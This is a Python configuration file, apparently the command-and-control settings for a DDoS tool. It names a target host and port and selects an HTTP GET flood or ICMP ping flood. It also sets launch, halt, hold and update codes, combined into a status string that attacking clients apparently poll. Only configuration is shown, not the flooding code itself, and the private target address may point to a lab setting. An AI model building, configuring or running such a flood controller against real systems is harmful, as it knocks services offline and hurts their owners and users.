ATTACK_TARGET_HOST = "192.168.0.105" # IP address of the machine to be attacked.
ATTACK_TARGET_PORT = "3000" # Port Number of the machine to be attacked.

#################################################################################

# Type of Attacks (Other Attacks are not yet supported)
	#HTTPFLOOD - Floods the target system with GET requests. (PORT and DELAY parameters required)
	#PINGFLOOD - Floods the target system with ICMP echo requests. (PORT AND DELAY parameters not required)

ATTACK_TYPE = "PINGFLOOD"

# Number of seconds delay between the burst of requests. 0 for No Delay
ATTACK_BURST_SECONDS = "0" 

#################################################################################

#Status codes that has to be set from the below list. 
	# HALT - To stop attacks immediately.
	# LAUNCH - To immediately start the attack.
	# HOLD - Wait for command.
	# UPDATE - Update Client.

ATTACK_CODE = "HALT" # Choose any one Flag from above

#################################################################################


ATTACK_STATUS = ATTACK_TARGET_HOST + "_" + ATTACK_TARGET_PORT + "_" + ATTACK_CODE + "_" + ATTACK_TYPE + "_" + ATTACK_BURST_SECONDS
